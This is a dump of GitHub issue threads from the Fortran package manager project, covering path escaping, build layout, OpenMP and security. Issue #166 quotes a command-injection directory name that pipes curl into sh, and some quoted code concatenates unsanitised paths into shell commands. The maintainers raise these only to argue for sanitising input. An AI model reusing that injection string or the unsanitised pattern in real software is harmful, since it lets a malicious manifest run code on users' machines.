            "text": "I found this setting up challenging tests for #155, but it is also not working in bootstrap fpm as well.\nConsider a project like this\n.\n\u251c\u2500\u2500 app dir\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main prog.f90\n\u251c\u2500\u2500 app\"dir\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main\"prog.f90\n\u251c\u2500\u2500 app'dir\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main'prog.f90\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 source dir\n    \u2514\u2500\u2500 escape_m.f90\n\nOf course, projects with such a structure are usually discouraged, but obviously not forbidden.\nThe fpm.toml for such a project would look like:\nname = \"escape chars\"\n\n[library]\nsource-dir = \"source dir\"\n\n[[executable]]\nname = \"with spaces\"\nsource-dir = \"app dir\"\nmain = \"main prog.f90\"\n\n[[executable]]\nname = \"single'quotes\"\nsource-dir = \"app'dir\"\nmain = \"main'prog.f90\"\n\n[[executable]]\nname = \"double\\\"quotes\"\nsource-dir = \"app\\\"dir\"\nmain = \"main\\\"prog.f90\"\nAnd it is indeed a valid TOML document. But building with bootstrap fpm will fail due to spaces in the project name:\n> fpm build\n# ar (for build/gfortran_debug/escape chars/libescape chars.a)\nar: creating build/gfortran_debug/escape\nar: chars/libescape: No such file or directory\nfpm: Error when running Shake build system:\n  at want, called at src/Build.hs:205:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_debug/escape chars/libescape chars.a\n  at cmd, called at src/Build.hs:204:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Raised the exception:\nDevelopment.Shake.cmd, system command failed\nCommand line: ar rs build/gfortran_debug/escape chars/libescape chars.a 'build/gfortran_debug/escape chars/escape_m.o'\nExit code: 1\nStderr:\nar: creating build/gfortran_debug/escape\nar: chars/libescape: No such file or directory\n\nProbably escape-chars is a better project name, but we still cannot run the executables:\nfpm run with\\ spaces\n/bin/sh: /home/awvwgk/projects/src/github.com/fortran-package-manager/test/example_packages/escape-chars/build/gfortran_debug/app: No such file or directory\n\nA complete version of this package is here:  escape-chars.zip.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-08 12:11:13+00:00",
                    "text": "I'll look into this with #155. I don't think double quotes are allowed for directories or files in Windows, so perhaps we should simply not support them at all - this would also make sanitization of command line execution easier as well I think (#166)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-08 16:26:52+00:00",
                    "text": "Fixing the creation of the archive was actually a simple change:\ndiff --git a/bootstrap/src/Build.hs b/bootstrap/src/Build.hs\nindex ffbf264..7eb9338 100644\n--- a/bootstrap/src/Build.hs\n+++ b/bootstrap/src/Build.hs\n@@ -201,7 +201,7 @@ buildLibrary libraryDirectory sourceExtensions buildDirectory compiler flags lib\n           archiveFile %> \\a -> do\n             let objectFiles = Map.keys sourceFileLookupMap\n             need objectFiles\n-            cmd \"ar\" [\"rs\"] a objectFiles\n+            cmd \"ar\" [\"rs\"] [a] objectFiles\n           want [archiveFile]\n     return archiveFile\n \nUnfortunately, I'm not yet there for the executables. They are found correctly in bootstrap fpm, but the shell invocation is not escaping them:\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n        Lines 153 to 154\n      in\n      cd10478\n    \n    \n    \n    \n\n        \n          \n           system \n        \n\n        \n          \n           (map (++ \" \" ++ commandArguments args) canonicalExecutables) \n        \n    \n  \n\n\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n        Lines 187 to 188\n      in\n      cd10478\n    \n    \n    \n    \n\n        \n          \n           system \n        \n\n        \n          \n           (map (++ \" \" ++ commandArguments args) canonicalExecutables) \n        \n    \n  \n\n\nI will toy around with the Haskell implementation until I can figure this part out as well. Some pointers from the Haskell programmers around are of course appreciated."
                }
            ]
        },
        {
            "number": 166,
            "user": "awvwgk",
            "date": "2020-09-07 20:20:20+00:00",
            "title": "Security of execute_command_line",
            "text": "Since we are using execute_command_line quite a lot in Fortran fpm right now, we should think about a safe alternative for all external command invokations or a way to harden the input to execute_command_line against exploits.\nInjecting bash code with directory names from fpm.toml using something like '; curl something | sh #' would be one example to exploit the current way we are handling directory names. And '; curl something | sh #' happens to be a perfectly fine directory name on Unix systems.\nAs this projects matures a security policy regarding those issues is needed to avoid having exploits discussed publicly in an issue.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 15:05:33+00:00",
                    "text": "Eventually we should be able to not resort to execute_command_line at all.\n\nFor file system operations, we'll be able to use stdlib_os which is slated to become part of stdlib;\nFor git, we should interface libgit2.\nFor getting any other stuff from the web, we should interface curl, @interkosmos has Fortran bindings here.\n\nIn the interim, I think it's okay to be less safe in favor of prototyping."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-10 08:34:30+00:00",
                    "text": "Eventually we should be able to not resort to execute_command_line at all.\n\nDoes this include execution of compiler commands as well?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-10 11:33:30+00:00",
                    "text": "I forgot about the compilers.. :)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-10 13:27:01+00:00",
                    "text": "My understanding is that typical security practices are to identify all user input, and ensure that it is sanitized immediately upon being read in. It's also important to have some understanding of the attack vectors you're trying to protect against. It's more about where the data comes from than the just the call to execute_command_line. For example execute_command_line(\"find ./ -name '*.f90'\") is perfectly safe, but execute_command_line(\"find ./ -name '*.\" // fortran_extension // \"'\") would not be safe if fortran_extension comes from user input.\nI'm guessing the main attack vector we're trying to protect against is a malicious fpm.toml. Conceivably, someone could put malicious code in an fpm.toml and publicize that package. Anyone listing that package as a dependency would execute the malicious code simply by building their package. So, anything being read from fpm.toml needs to be checked to make sure it is safe.\nHowever, there is an attack vector that I'm not sure we can reasonably protect against; malicious Fortran code in a package. It will always be the responsibility of users of a package to verify that it does not contain malicious Fortran code; especially if using a package not in the official registry. By the time code is fed to the compiler or makes it into an executable, fpm is not what's executing it, and can't really do anything about it."
                },
                {
                    "user": "certik",
                    "date": "2020-09-10 21:27:49+00:00",
                    "text": "Also the way fpm is designed (after #155 is merged) is that the front-end parses all user input and must ensure that nothing malicious happens, and then populates the model. We should ensure that the model does not contain anything malicious. After that it is the job of the backend to properly execute the build."
                }
            ]
        },
        {
            "number": 165,
            "user": "LKedward",
            "date": "2020-09-07 16:41:55+00:00",
            "title": "Support registry meta-data fields in manifest",
            "text": "Now that we have fpm-registry I think we should add official support for various meta-data fields in the fpm.toml manifest including description, keywords, categories, and homepage.\nLooking to cargo as an example, it requires the following fields before a crate can be published.\nChecking and validating the fields is a job for the fpm-registry CI, this issue is just to enable support within fortran fpm.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 18:49:32+00:00",
                    "text": "It would require a schema definition or at least any kind of documentation what is allowed in a package manifest, description is actually missing in the PACKAGING.md, which I took as reference for the allowed keys.\nAlso the two available implementation follow very different strategies. The boostrap implementation ignores everything except the needed keys, while the Fortran implementation does not allow anything except the keys hardcoded in the executable."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-12 09:30:10+00:00",
                    "text": "I think adding all those keywords to the toplevel might overload the package file a bit, having additional sections for meta information would probably be best, e.g. conda-build is using about. We could support an extra section as well, which is not governed by any schema and allows to test new sections or keys."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:29:52+00:00",
                    "text": "Done with #171."
                }
            ]
        },
        {
            "number": 164,
            "user": "LKedward",
            "date": "2020-09-07 11:06:47+00:00",
            "title": "Automatically discover executables & tests",
            "text": "Currently you are required to explicitly specify each test and executable in the fpm manifest file.\nThis is a lot of manual work and can lead to overly-verbose manifests (see M_system for example).\nI don't think this is necessary for implementation and I would rather have executables and tests in the default locations to be discovered automatically. Is this not how cargo does it?\nThe existing [[test]] and [[executable]] entries can be retained for specifying custom settings for individual executables & tests.\nI believe this behaviour was mentioned in #105 (comment) and is also related to #91.\nThis is very easy to implement in the fortran implementation from #155; the implementation already discovers all programs, but currently filters out those not specified in fpm.toml in order to match existing behaviour.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 18:31:58+00:00",
                    "text": "I'd be okay with making some changes to the \"default\" functionality, so long as the following are satisfied:\n\nIt can be easily explained to a user without many (any?) caveats and exceptions\nIt is possible to achieve exactly the same functionality when explicitly declared in fpm.toml\nIt doesn't encourage bad practices (granted that may be fairly subjective)\n\nFor example, implicit none requires the programmer to be more explicit, and involves more work, but is at this point pretty universally considered to be best practice (i.e. would be considered bad practice not to include it).\nFor me, having multiple programs and modules in one directory would be \"bad practice\", because for someone trying to understand your project, it is no longer clear which files are programs and which are modules, or which modules are used by which programs, at least not without opening and reading each file.\nI would be ok with having multiple programs in a single directory provided there are no modules in that directory. But I do struggle a bit with what it would look like to specify that in fpm.toml.\nI would also be ok with having multiple programs in separate folders being detected automatically, but I struggle a bit with what folders it should look in? Maybe just subdirectories of the app folder?\nSo with those ideas, we effectively end up with 3 possible \"default\" fpm.toml specifications.\n\nA single [[executable]] entry with app as the directory and main.f90 as the file\nSomehow specifying app as a directory containing multiple programs\nMultiple [[executable]] entries (1 for each subdirectory of app)\n\nThere are then multiple \"error\" conditions that must be checked, with some being unclear as to what the user might have expected to happen.\n\nWhat if multiple programs and 1 or more modules are found in the app folder?\nWhat if there is a file app/main.f90 and subdirectories of app?\n\nI'm open to ideas, these are just some of my concerns."
                },
                {
                    "user": "certik",
                    "date": "2020-09-08 18:40:43+00:00",
                    "text": "I think we should do it like Cargo does it, which is to agree on a standard layout and as long as you follow it, you don't have to specify anything in fpm.toml. Here is the Cargo's layout: https://doc.rust-lang.org/cargo/guide/project-layout.html\nSo we will have app/program1.f90 and app/program2.f90 to be two single file executables, and for multi file executables we will have subdirectories of app. The same layout that Cargo is doing, only instead of src/bin, we have app."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 19:47:44+00:00",
                    "text": "I think the Cargo way does make for a decently easy to understand and describe usage, although it does make explicit specification in fpm.toml more complicated, and complicates (for me at least) the most common use case, where I've got one (test) program with multiple modules. This would require me to put them in a subdirectory of app (or test) even though I've only got one. Not a big deal, just worth mentioning.\nI'd be curious to see what it would look like to specify additional details (compiler flags, link flags, etc.) for specific tests or executables as well. I'm not opposed to doing it this way, I'd just like to see some examples before we make a decision."
                },
                {
                    "user": "certik",
                    "date": "2020-09-08 20:24:24+00:00",
                    "text": "@everythingfunctional can you show an example project where you have one test program with multiple modules that you only want to be part of this test program and not the library (in src)?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-09 02:53:44+00:00",
                    "text": "That's how my testing framework works. All of the tests are written in modules, and all of the tests are run via a single executable. And so all of my libraries' tests are written that way."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-09 09:07:38+00:00",
                    "text": "I disagree with placing unnecessary constraints on package layout based on arguments of \"bad practice\" since there is always a package or use-case that will justifiably need to go against such constraints. The analogy with implicit none is stretching (IMO) since implicit typing easily leads to undesirable program behaviour whereas package layout is more aesthetic in nature.\nI'm proposing automatic discovery based on a default layout like Cargo, but with a simpler (and looser) set of rules:\n\nBy default, fpm looks in app, and any subdirectories therein, for executable targets;\nExecutable targets are 'module-associated' and linked with any other (non-executable) sources in the same directory as the executable source.\n\nFor me, this is simple to understand conceptually and flexible enough for all use cases.\nThis allows Brad's use-case of a single executable + multiple modules and my common use-case of multiple executables with one or two supporting (non-library) modules.\nThe corresponding 'default' fpm.toml entry would be something akin to:\napp-dir = \"app\"\ntest-dir = \"test\"\n\nwith [[executable]] and [[test]] available for individual program customisation.\nI can mock-up some working cases later as examples."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-09 14:49:33+00:00",
                    "text": "There's a mostly working demo on my program_discovery branch, where I've changed the hello_complex example to:\n\u251c\u2500\u2500 apps\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 app_mod.f90\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 say_goodbye.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 say_hello\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 app_hello_mod.f90\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 say_Hello.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 source\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 farewell_m.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 greet_m.f90\n\u2514\u2500\u2500 tests\n    \u251c\u2500\u2500 farewell_test.f90\n    \u251c\u2500\u2500 greet_test.f90\n    \u2514\u2500\u2500 test_mod.f90\n\nwith manifest:\nname = \"hello_complex\"\n\napp-dir=\"apps\"\ntest-dir = \"tests\"\n\n[library]\nsource-dir=\"source\"\n\n[[executable]]\nname=\"say_hello_world\"\nsource-dir=\"apps/say_hello\"\nmain=\"say_Hello.f90\"\n\nwhich demonstrates:\n\nautomatic app/test discovery in app-dir/test-dir\n'app-private' modules (in same directory)\napp customisation in fpm.toml"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 15:11:39+00:00",
                    "text": "That's how my testing framework works. All of the tests are written in modules, and all of the tests are run via a single executable. And so all of my libraries' tests are written that way.\n\n@everythingfunctional Would this issue go away if you put your test modules in the same source file as the program that calls them? In that case the default fpm/Cargo approach would work for you out of the box without specifying anything."
                },
                {
                    "user": "certik",
                    "date": "2020-09-09 15:49:55+00:00",
                    "text": "Unlike Rust, Fortran has the advantage that we can easily figure out which modules are used by what program, so @LKedward's proposal will work great. I suggest we do that.\nFurthermore, I would suggest that for this layout:\n\u251c\u2500\u2500 apps\n\u2502   \u251c\u2500\u2500 app_mod.f90\n\u2502   \u251c\u2500\u2500 say_goodbye.f90\n\u2502   \u2514\u2500\u2500 say_hello\n\u2502       \u251c\u2500\u2500 app_hello_mod.f90\n\u2502       \u2514\u2500\u2500 say_Hello.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 farewell_m.f90\n\u2502   \u2514\u2500\u2500 greet_m.f90\n\u2514\u2500\u2500 tests\n    \u251c\u2500\u2500 farewell_test.f90\n    \u251c\u2500\u2500 greet_test.f90\n    \u2514\u2500\u2500 test_mod.f90\n\nIt should just work with this fpm.toml:\nname = \"hello_complex\"\n\nSince fpm can figure out everything.\nWe can discuss whether the apps dir should be called app or bin or src/bin or src/app or src/apps, but the idea stays the same."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-09 17:13:21+00:00",
                    "text": "@milancurcic , no, because the program is generated by a program I wrote to scan your tests. And I don't believe we support having modules in with a program.\nI think @LKedward 's approach is probably headed in the right direction. I'll take a look at the implementation."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 20:30:56+00:00",
                    "text": "And I don't believe we support having modules in with a program.\n\nBoth Haskell and Fortran fpm support this now and we should continue to support it. I will contribute an example to the existing suite of test packages. But it's irrelevant for your use case as you say."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-13 17:10:23+00:00",
                    "text": "My most common case for tests is that all the tests call three modules. One has things like routines to compare reals and tables of numbers and statistics routines; another is a logging utility and the other is a debug utility that mostly concentrates on fail/pass procedures and allowing scripts to be called with the results (which then pass data to databases, web pages, log files, ...) So if I have multiple programs (perhaps dozens) that all use those modules and I wanted one directory for the programs and one for the modules would I put the modules in app/ and the programs in app/programs/ or the programs in app/ and the modules in app/modules/ or have app/programs and appl/modules? I am thinking any of those are better than having 20 subdirectories right now; but wondering if you are envisioning all three of those to work?\nI branched my own fpm so I could use POSIX-ony libraries like M_systems and fortran-libcurl and parse everything with M_CLI2 so I could get a better feel for how this will work some day; and I have found\n1) It is much nicer to use fpm if it looks for the fpm.toml file in directories above it which I found can be complicated by softlinks a bit but is pretty basic but requires testing if files exist and changing directories\n2) that it is really useful to have a --list option on run and test in particular to show you what programs are going to be built and their pathnames.  I also think it would be nice if that listing was written out in fpm.toml format so you could quickly build/rebuild fpm.toml; but perhaps I would not need that as much with the autoscan described above\n3) I personally found that moving past a basic build with just a few modules that having something like .gitignore becomes essential. Even as it is now I found the original fpm failing because it \"found\" some working files I had in directories or reference files. The proposed changed would have it finding even more. I often want files in a directory for reference or during development that I have to keep renaming so they are not \"discovered\". Even just being able to specify a directory NOT be searched like  A  .fmpignore with FODDER/ in it (ie. do not search directory FODDER) is handly. Not sure how common an issue that is for others, but having looked at many packages over the years they often have unused or platform-specific files sitting with the production ones.\nSo an upward search for fpm.toml; an ability to do a dry run with a listing of builds (perhaps with output in fpm.toml format; and something that lets files be ignored (the git(1) .gitignore model works for me) are on my wishlist."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-16 08:58:41+00:00",
                    "text": "So if I have multiple programs (perhaps dozens) that all use those modules and I wanted one directory for the programs and one for the modules would I put the modules in app/ and the programs in app/programs/ or the programs in app/ and the modules in app/modules/ or have app/programs and appl/modules?\n\nUnfortunately my proposed changes won't allow the configurations you've mentioned; it will avoid the need to have 20 subdirectories, but will require both modules and programs to be all in the same directory.\nA possible solution for your logging/debug modules etc. is to store them in a separate package and include them as [dev-dependencies] which are only required for the test programs.\nI would support a file ignore list as an entry in fpm.toml or as a .fpmignore file. Also dry run is a good idea that should be implemented."
                },
                {
                    "user": "certik",
                    "date": "2020-09-16 14:01:24+00:00",
                    "text": "@urbanjost fpm should have an option to allow users like you to use it. Experience with Cargo and Rust shows that having a default layout and autodiscovery works excellent for over 90% of packages, and the rest just needs some way to be able to use it, perhaps adding options to fpm.toml to disable autodiscovery as you suggested."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:16:56+00:00",
                    "text": "Closing as implemented in #190"
                }
            ]
        },
        {
            "number": 163,
            "user": "awvwgk",
            "date": "2020-09-05 19:42:31+00:00",
            "title": "Use different strategy to fetch git dependencies",
            "text": "matches strategy of GitHub's actions/checkout workflow\nuse init -> fetch -> checkout -qf FETCH_HEAD instead of current clone [-> checkout] strategy\nalways works in detached HEAD\nallows to update the git dependency with the same commands (Related: #121)\nchange directory with -C command (easier to match for later Fortran implementation, available since git 1.8.5)\n\nCan probably be implemented much nicer, but my Haskell skills don't go beyond the Try it! tutorial on haskell.org",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 18:50:43+00:00",
                    "text": "I was unaware of the -C path option for git. I think this is a good idea, if for no other reason than the Fortran implementation can use exactly the same commands.\nAs for the implementation, I'm not sure I would have done it any different."
                }
            ]
        },
        {
            "number": 162,
            "user": "interkosmos",
            "date": "2020-09-05 18:16:01+00:00",
            "title": "Updated OS type identification",
            "text": "As noted in the source code and discussed in #144, the OS detection of get_os_type() in fpm/src/environment.f90 is not accurate. Please review this request, which checks environment variables and the existance of some files in order to determine the OS more precisely.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-07 15:07:52+00:00",
                    "text": "Thanks @interkosmos, this looks like an improvement. Do note that you'll need to update any functions that use get_os_type such as list_files in fpm.f90 to consider all different OS behaviours.\nI'm hoping #155 will be merged soon, and this further increase the usage of get_os_type (mainly for filesystem/command_line interaction) so it may be best to wait for this to be merged?\nI have no experience with Solaris or BSD so I don't know what quirks need to be specifically addressed, but we may run into the problem that we cannot test them in the CI."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 21:06:22+00:00",
                    "text": "@LKedward BSD could be tested using Cirrus CI, which provides FreeBSD images. Grouping it together with OSX and Linux will probably be fine for most use cases right now, to avoid another CI provider for this project.\nTesting cygwin is not (easily) possible on the GH actions windows image as well, which means another CI provider would be required for this purpose (like Appveyor).\nNo idea where to find a CI solution for Solaris."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-08 09:20:14+00:00",
                    "text": "In most cases, the behaviour of OS_LINUX, OS_MACOS, OS_CYGWIN, OS_SOLARIS, and OS_FREEBSD should be identical, if we stick to POSIX standards. I can\u2019t say if there are any CI providers that feature OpenSolaris-based images (OpenIndiana, illumos, Tribblix, \u2026)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-12 14:27:15+00:00",
                    "text": "@interkosmos, would you mind also updating the following uses of get_os_type() in order to prevent the select case statements from silently falling through?\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 51 to 56\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n           case (OS_LINUX,OS_MACOS) \n        \n\n        \n          \n               filesep = '/' \n        \n\n        \n          \n           case (OS_WINDOWS) \n        \n\n        \n          \n               filesep = '\\' \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 117 to 124\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n           case (OS_LINUX,OS_MACOS) \n        \n\n        \n          \n               call execute_command_line(\"mkdir -p \" // dir , exitstat=stat) \n        \n\n        \n          \n               write(*,*) \"mkdir -p \" // dir \n        \n\n        \n          \n           case (OS_WINDOWS) \n        \n\n        \n          \n               call execute_command_line(\"mkdir \" // windows_path(dir), exitstat=stat) \n        \n\n        \n          \n               write(*,*) \"mkdir \" // windows_path(dir) \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 148 to 158\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n               case (OS_LINUX) \n        \n\n        \n          \n                   call execute_command_line(\"ls \" // dir // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n               case (OS_MACOS) \n        \n\n        \n          \n                   call execute_command_line(\"ls \" // dir // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n               case (OS_WINDOWS) \n        \n\n        \n          \n                   call execute_command_line(\"dir /b \" // windows_path(dir) // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_command_line.f90\n    \n    \n        Lines 66 to 73\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n               case (OS_LINUX) \n        \n\n        \n          \n                   print *, \"OS Type: Linux\" \n        \n\n        \n          \n               case (OS_MACOS) \n        \n\n        \n          \n                   print *, \"OS Type: macOS\" \n        \n\n        \n          \n               case (OS_WINDOWS) \n        \n\n        \n          \n                   print *, \"OS Type: Windows\" \n        \n\n        \n          \n           end select"
                },
                {
                    "user": "certik",
                    "date": "2020-09-14 21:00:27+00:00",
                    "text": "The current failure is (on Windows):\nCommand line: gfortran -c -Jbuild\\gfortran_debug\\fpm -Ibuild\\gfortran_debug\\toml-f -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -o build/gfortran_debug/fpm/fpm_filesystem.o src\\fpm_filesystem.f90\nExit code: 1\nStderr:\nsrc\\fpm_filesystem.f90:2:10:\n\n     use :: fpm_environment, only: get_os_type, &\n          1\nFatal Error: Can't open module file 'fpm_environment.mod' for reading at (1): No such file or directory\ncompilation terminated.\n\nSo that needs to be fixed before we can merge it."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-14 21:25:44+00:00",
                    "text": "@certik: does this happend because fpm_filesystem.f90 is compiled before fpm_environment.f90 by fpm?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-14 21:31:27+00:00",
                    "text": "@interkosmos can you try reverting to the non colon form of the use statement - this may be a bug in Haskell fpm."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-15 12:16:11+00:00",
                    "text": "Please excuse the inconvenience."
                }
            ]
        },
        {
            "number": 161,
            "user": "awvwgk",
            "date": "2020-09-05 07:41:59+00:00",
            "title": "Build-in dependencies for fpm: OpenMP",
            "text": "OpenMP is probably one of the easiest non-fpm compatible dependency fpm could provide. OpenMP is usually shipped with the compiler. For the current scope of GCC we only have to add -fopenmp to both compile and link arguments and are done, therefore it might be a useful prototype to explore the usage of built-in dependencies for fpm.\nFollowing the current scheme an empty table would do the trick and is flexible enough to allow customization for other build-in dependencies later.\n[dependencies]\nopenmp = {}\nRelevant discussion regarding package name conflicts: fortran-lang/fpm-registry#8, in case a package wants to call itself openmp.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-07 10:15:14+00:00",
                    "text": "I agree this is should be a simple area to prototype such features, however I'm not a fan of the proposed manifest syntax.\nIMO, this seems to be more of compiler feature that needs enabling rather than a 'dependency' that needs satisfying.\nPerhaps:\n[compiler]\nopenmp = true\nAlso in the same vein:\n[compiler]\nlto = true             # link-time optimisation\nacc = true             # OpenACC support\nfflags = \"-fopt-info\"  # Appended to built-in flags list\nlflags = \"-lblas\"\nfpm will then have a supported list of compilers for which it implements any compiler-specific syntax under the hood.\nWhat do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 18:00:02+00:00",
                    "text": "True, it usually feels like a compiler command when using it, but there is a lot automation for us hidden in the compiler.\nI thought of it more like a dependency since it is handled in conda like one (see https://conda-forge.org/docs/maintainer/knowledge_base.html#openmp). Also meson is handling it usually as a dependency rather than a compiler command (see https://mesonbuild.com/Dependencies.html#openmp).\nHaving a dependency model that allows propagating linker and compiler flags would be well suited for OpenMP as well in fpm. OpenMP would be useful as simple prototype if dependencies require to export link or compile flags to a dependent project. Projects using OpenMP must propagate at least the linker flag, possibly also the library with the OpenMP implementation to dependent projects to allow correct linking."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-04 11:35:10+00:00",
                    "text": "It would be good to get this implemented so that we can self-bootstrap Fortran fpm with parallel builds enabled.\nI am however still opposed to the treatment of OpenMP as a dependency in the manifest syntax; OpenMP isn't just an additional library for linking, it changes the way the compiler behaves in processing sources and in generating code. Similarly the invocation flag and link libraries are different for each compiler. Hence why I think an entry like openmp=true in the existing [build] table is more appropriate (#112). What do other people think?\n\nHaving a dependency model that allows propagating linker and compiler flags would be well suited for OpenMP as well in fpm.\n\nAgreed, but I see no reason to conflate the manifest syntax for OpenMP with that of package dependencies."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 11:45:03+00:00",
                    "text": "I think we should get #112 working first, this would allow us to define flags on a per package basis (optimization) and global flags that propagate in the dependency tree (fast-math). Based on this we can easily implement OpenMP as either a build.openmp entry or a dependency."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 12:10:25+00:00",
                    "text": "I am however still opposed to the treatment of OpenMP as a dependency in the manifest syntax; OpenMP isn't just an additional library for linking, it changes the way the compiler behaves in processing sources and in generating code. Similarly the invocation flag and link libraries are different for each compiler.\n\nKeep in mind that OpenMP is versioned as well, how do we deal with the fact that a program requires OpenMP version 4.5 or newer if the compiler used only provides OpenMP 3.x?\nAnother important thing is linking against the OpenMP runtime, if you use LLVM and GCC toolchains on your system you can link GCC applications with the LLVMs OpenMP runtime library and vice versa, depending on the features used. Same holds true for Intel OpenMP which can safely be linked into GCC compiled application instead of the GCC OpenMP runtime library.\nCreating an OpenMP dependency, which exports compiler flags to the dependent projects would allow to safely support various OpenMP implementation including versioning and also gives you the freedom to overwrite the OpenMP dependency by creating a mock fpm-package to export your special OpenMP setup."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-04 12:56:57+00:00",
                    "text": "Can these cases not also be specified in the [build] table, e.g.:\n[build]\nopenmp = true\nopenmp-version = \"^4.5\"\nopenmp-library = \"iomp5\"\nWe will already need logic for correctly exporting compiler options to dependents, why not use the same model for OpenMP?\nPerhaps I am misunderstanding you; is your intention that there is no special code for handling OpenMP and that the OpenMP dependency is processed internally in exactly the same way as any other dependency?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 13:35:57+00:00",
                    "text": "I would prefer to extend the current dependency model to support OpenMP on equal footing with normal fpm dependencies. With a solution for #112 we should be able to create an fpm package that will enable OpenMP support in its dependents.\nSupporting OpenMP with this approach wouldn't require any special entries in build and allows to test if this is a suitable model for OpenMP before implementing a special shortcut with build.openmp in the package manifest. I'm not opposed to create a build.openmp entry, but I wouldn't make it the first step for supporting OpenMP."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-04 14:14:03+00:00",
                    "text": "... we should be able to create an fpm package that will enable OpenMP support in its dependents.\n\nAh I see, I understand what you mean now. Thanks for explaining (and for your patience ;)). This is an elegant approach.\nSo a hypothetical default OpenMP package manifest might look something like this then:\nname=\"OpenMP\"\n\n[build]\ncompile-args.gfortran= [\"-fopenmp\"] # append\ncompile-args.ifort= [\"-qopenmp\"]\n# etc...\nor, to introduce a possible general syntax, perhaps:\nname=\"OpenMP\"\n\n[build]\n[[compiler-arg]]\ngfortran= [\"-fopenmp\"]\nifort= [\"-qopenmp\"]\n# ...\nexport = \"link\"         # export arg to linker command only\n# export = \"dependents\" # export arg up to dependent packages only\n# export = \"all\"        # export arg to entire project"
                }
            ]
        },
        {
            "number": 160,
            "user": "awvwgk",
            "date": "2020-09-03 12:52:46+00:00",
            "title": "Add contributing guidelines",
            "text": "adds a draft for contributing guidelines for fpm\n\nI have written those guidelines from scratch some time ago, they appeared first in this LGPL licensed project. I can contribute them under MIT license or any other fitting license for fpm.\nFeel free to push to this branch to adjust the guidelines to your liking.\ncloses #158",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 13:39:28+00:00",
                    "text": "Thank you @awvwgk. Most of it we can use but can be condensed without losing meaning. I'll take the next stab at it.\nI prefer not requiring signed commits. If anything, we can say in the guidelines something like:\n\nBy contributing to fpm, you certify that you own or are allowed to share the content of your contribution under the fpm license.\n\n@certik what do you think?"
                },
                {
